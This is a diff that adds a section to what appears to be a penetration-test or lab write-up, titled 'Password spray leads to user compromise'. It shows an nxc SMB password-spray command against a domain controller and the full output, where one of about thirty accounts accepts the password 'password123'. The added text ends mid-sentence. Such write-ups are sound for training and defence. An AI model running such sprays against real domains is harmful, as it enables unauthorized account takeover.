@@ -360,5 +360,37 @@ The hash does not crack
 # Password spray leads to user compromise
 
 ```python
-
+nxc smb dc.novacart.local -u users.txt -p password123 --continue-on-success
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [-] novacart.local\Administrator:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\Guest:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\krbtgt:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.bronski:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.barowski:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\svc_jenkins:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [+] novacart.local\j.paul:password123 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.ruehl:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.winkler:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.dillon:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\t.morris:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrow:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.forta:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\p.bruce:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.mignola:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.thompson:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.brown:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.ibabao:password123 STATUS_ACCOUNT_RESTRICTION 
+SMB         10.0.18.23      445    DC               [-] novacart.local\andrew.collins:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.turner:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.parker:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.bennett:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrison:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\o.griffin:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\j.clark:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.hughes:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\d.james:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\m.miller:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\s.diaz:password123 STATUS_LOGON_FAILURE 
+SMB         10.0.18.23      445    DC               [-] novacart.local\cliff.b:password123 STATUS_LOGON_FAILURE
 ```
+So there is one user who is giving the error ``
